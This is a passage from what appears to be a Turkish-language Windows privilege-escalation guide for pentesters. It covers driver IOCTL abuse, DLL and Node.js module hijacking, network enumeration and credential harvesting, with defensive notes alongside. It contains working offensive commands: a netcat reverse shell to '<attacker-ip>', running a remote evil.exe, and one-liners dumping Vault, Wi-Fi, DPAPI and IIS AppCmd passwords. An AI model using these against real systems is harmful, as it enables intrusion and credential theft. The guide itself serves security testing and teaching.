#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan aygıt nesnelerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıran bağlamını doğrulayın. İşlem sonlandırmaya veya handle döndürmeye izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL’leri (erişim maskeleri, METHOD_*, girdi doğrulaması) kısıtlayın ve doğrudan kernel ayrıcalıkları yerine broker tabanlı modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli aygıt adlarına (ör. \\ .\\amsdk*) yönelik user-mode açma işlemlerini ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un güvenlik açığı bulunan sürücü engelleme listesini (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/engelleme listelerinizi güncel tutun.


## PATH DLL Hijacking

**PATH üzerindeki bir klasörde yazma izinleriniz** varsa, bir işlem tarafından yüklenen bir DLL’i ele geçirerek **ayrıcalıkları yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Daha fazla bilgi için bu kontrolün nasıl istismar edileceğine bakın:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, `require("foo")` gibi yalın bir import gerçekleştiren ve beklenen modülün **bulunmadığı** durumlarda **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü köküne kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş zamanlanmış bir görev/hizmet sarmalayıcısı üzerinden veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- bir bağımlılık `optionalDependencies` içinde tanımlıysa<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ediyorsa
- bir paket üretim derlemelerinden kaldırılmışsa, paketleme sırasında atlanmışsa veya yüklenememişse
- güvenlik açığı içeren `require()` ana uygulama kodunda değil, bağımlılık ağacının derinlerinde yer alıyorsa

### Güvenlik açığı bulunan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef çalıştırılabilir dosyaya (`node.exe`, Electron uygulamasının EXE dosyası veya sarmalayıcı süreç) ayarlayın
- `Path` filtresini `node_modules` `contains` olacak şekilde ayarlayın
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açılışa odaklanın

Açılmış `.asar` dosyalarında veya uygulama kaynaklarında dikkat edilmesi gereken kod inceleme örüntüleri:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesiyle **eksik paket adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen adla tam olarak eşleşen bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yapar ve meşru modül yoksa Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan eksik isteğe bağlı modüllere gerçek dünyadan örnek olarak `bluebird` ve `utf-8-validate` verilebilir; ancak yeniden kullanılabilir olan **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleyeceği herhangi bir **eksik yalın içe aktarma** bulun.

### Tespit ve güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlük düzeyindeki süreçleri araştırın.
- Üretimde tüm çalışma zamanı bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlardaki sessiz `try { require("...") } catch {}` örüntülerini gözden geçirin.
- Kütüphane destekliyorsa isteğe bağlı yoklamaları devre dışı bırakın (örneğin, bazı `ws` dağıtımları `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` yoklamasını önleyebilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlanmış hizmetleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi süreç sahibi, çalıştırılabilir dosya yolu ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Bir uzaktan kontrol hizmeti, yalnızca kimlik doğrulaması ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve ikili dosya yolu pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolu ise tam olarak bu ikilinin ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir port sistem sürecine ait görünüyorsa, arka uç hizmetini ilişkilendirmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) ile karşılaştırın; yalnızca bir yönlendirme kuralının bulunması, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

Ağ keşfi için daha fazla [komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` şu konumda da bulunabilir: `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

root user olursanız herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, GUI üzerinden `nc`'ye güvenlik duvarı tarafından izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı, tek başına Windows Administrator hakları vermez. Geçerli Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını (özellikle `/root/.bash_history` dosyasını) inceleyin; ayrıcalık yükseltme için yine de geçerli, daha yüksek ayrıcalıklı bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` dizin yapısı eski WSL kurulumları için geçerlidir; WSL 2'de dağıtım çoğunlukla bir [`ext4.vhdx` sanal diski](https://learn.microsoft.com/en-us/windows/wsl/disk-space) içinde saklanır. Bu nedenle öncelikle gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik enumerasyon sırasında geçmiş içeriğini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgisi değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` ayarlıysa ancak okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak depolayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterini sıradan yöntemlerle okumak, bu sırrın mevcut olup olmadığını veya alınabilir olup olmadığını ortaya koymaz. Kimlik bilgilerinin açığa çıktığını bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik Bilgileri Yöneticisi / Windows Vault

Kaynak: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault; **Windows**'ın kullanıcıları **otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini depolayıp tarayıcıların otomatik olarak oturum açmasını sağlayabilecekleri anlamına gelebilir; ancak sistem böyle çalışmaz.

Windows Vault, Windows'ın kullanıcıları otomatik olarak oturum açtırmak için kullanabileceği kimlik bilgilerini depolar. Bu da bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının** Credential Manager ve Windows Vault'tan **yararlanabileceği** ve kullanıcıların her seferinde kullanıcı adı ile parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynak için depolanan kimlik bilgilerini kullanabileceklerini sanmıyorum. Dolayısıyla uygulamanız kasadan yararlanmak istiyorsa, bir şekilde **Credential Manager ile iletişim kurup varsayılan depolama kasasından söz konusu kaynağa ait kimlik bilgilerini istemelidir**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary'yi çalıştırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla da erişilebileceğini unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları Universal Windows Platform (UWP) `PasswordVault` içinde saklar (`vaultcmd` içinde `Web Credentials` olarak da sunulur). Bu depolama alanı oturum bazında yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Kullanıcının etkin oturumu içinde bu PowerShell komutunu çalıştırarak saklanan tüm kullanıcı adlarını ve düz metin parolalarını anında dump edip çözebilirsiniz:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sunar ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunması için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Güvenlik Tanımlayıcısını](https://en.wikipedia.org/wiki/Security_Identifier) temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

`dpapi::masterkey` mimikatz modülünü uygun argümanlarla (`/pvk` veya `/rpc`) kullanarak şifresini çözebilirsiniz.

**Master password** ile korunan **kimlik bilgisi dosyaları** genellikle şurada bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey` uygun olduğunda, şifreyi çözmek için **mimikatz module** `dpapi::cred` kullanabilirsiniz.\
(root yetkiniz varsa) **sekurlsa::dpapi** modülüyle **memory** içinden birçok DPAPI **masterkey** **extract** edebilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini kolayca saklamanın bir yolu olarak genellikle **scripting** ve otomasyon görevlerinde kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılmış bir kimlik bilgisi herhangi bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script veya dosya envanteri böyle bir dosyaya işaret ediyorsa, `C:\Users` dizininde olduğunu varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette ayrıca geçerli yetkilere sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerlerini yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyada bulunan PS credentials değerlerinin şifresini çözmek için şunları yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Mimikatz `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekteki **birçok DPAPI masterkey'i çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcı Documents klasöründeki, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere okunabilir XML dosyalarını inceleyin. Bir XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı taramalar sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** da kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, kimlik bilgisi adayı olarak değerlendirin: [satıcının belirttiğine göre](https://www.donkz.nl/), profil koruması profili oluşturan hesaba ve bilgisayara bağlanabilir ya da daha az sıkı şekilde yapılandırılabilir. Bu dosyaya güvenmeden önce kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

İnsanlar bazen parola ve diğer bilgileri yapışkan not uygulamalarına kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar, LevelDB dahil başka kullanıcı profili depoları kullanabilir. SQLite dosyasının bulunmamasını notların olmadığı şeklinde değerlendirmeden önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının kopyalanması yakın zamanda kaydedilmiş notları içermeyebilir. `plum.sqlite-wal` dosyasını tutarlı bir veritabanı kopyasıyla birlikte saklayın ve varsa `plum.sqlite-shm` dosyasını da ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir parola yöneticisi kaydı, daha yüksek ayrıcalıklı bir oturumu doğrulayabilmek için ayrıca gerçek şifre çözme anahtarını ve uygulamaya özgü yorumlamayı gerektirir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **kimlik bilgilerinin** yapılandırılmış ve **kurtarılabilir** olması mümkündür.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, çoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Registry (Kimlik Bilgileri)

### Support-tool registry kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama registry anahtarları altında parola ile ilgili value adlarını tutar. Örneğin, [vendor'ın registry anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` value adı, 9'dan önceki sürümlerde yapılandırılmış statik bir oturum parolasını gösteriyordu. Bir value adı işareti yalnızca inceleme için bir ipucudur: bu kimlik bilgisine ilişkin değerlendirme yapmadan önce kurulu sürümü, okunabilir value verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılması ve o hesap için yetkilendirme gerekir. Şifreli verileri ve kurtarılan parolaları rutin envanter çıktısına dahil etmeyin.

### Korunan sayfaları olan paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa **dosya şifrelemesini** çalışma sayfası korumasından veya gizli sütunlardan ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz ve konuyla ilgili dosyaları inceleyin; kapsamlı envanter sırasında olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin varlığını ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrıca doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` yolunu uzaktan çalıştırma değişikliklerinin depolandığı yer olarak tanımlar; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya her ikisini kullanan bir betiğe yapılan ekleme ya da kaldırma başvurularını saklıyor olabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı AES anahtarını ve şifrelenmiş metni gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin; ardından yetki dahilinde ilgili içeriği, rutin envanter çıktısına sırları yazdırmadan inceleyin. Bir yama yolu, şifrelenmiş bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve derleme değişikliklerine sır eklemekten kaçının.

### Özel yerel yönetici parolası rotasyonu

Şirket içinde geliştirilmiş bir parola rotatörü, şifrelenmiş yerel yönetici parolasını yerel bir hizmette tutarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında saklayabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, listener'ını ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback üzerinde çalışan bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak yalnızca kimlik doğrulaması, ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme seed'i veya anahtar materyali şifreli verinin yanında erişilebilirse şifrelemeye güvenmeden önce kullanılan anahtar türetme yöntemini inceleyin. Açığa çıkmış bir seed'den Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketini kullanarak deterministik biçimde AES anahtarı türeten bir yöntem bu parolayı korumaya uygun değildir; Go, bu paketin güvenliğe duyarlı rastgelelik için uygun olmadığını belgeliyor. Kurtarılan parolayı bir yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu üyesi bir hesaba ait olduğunu doğrulayın. 